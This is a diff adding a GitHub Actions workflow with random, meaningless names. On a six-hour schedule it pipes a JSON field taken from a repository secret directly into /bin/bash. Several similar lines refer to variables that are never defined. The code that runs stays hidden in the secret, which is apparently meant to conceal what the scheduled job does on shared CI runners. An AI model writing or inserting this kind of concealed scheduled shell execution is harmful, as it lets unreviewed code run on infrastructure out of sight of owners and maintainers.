@@ -1,0 +1,21 @@
+name: huangjiao2315
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangjiao2315
+        env:
+          gu8: ${{ secrets.gu8 }}
+        run: |
+          echo $gu8 | jq -r .pcn42242 | /bin/bash
+          echo $ryets989 | jq -r .pn60 | /bin/bash
+          echo $muz428 | jq -r .yz80488 | /bin/bash
+          echo $deyuq46840 | jq -r .dhs079 | /bin/bash
+          echo $qucr938 | jq -r .pqctb6 | /bin/bash
+          echo $vv1 | jq -r .mz9012 | /bin/bash
+
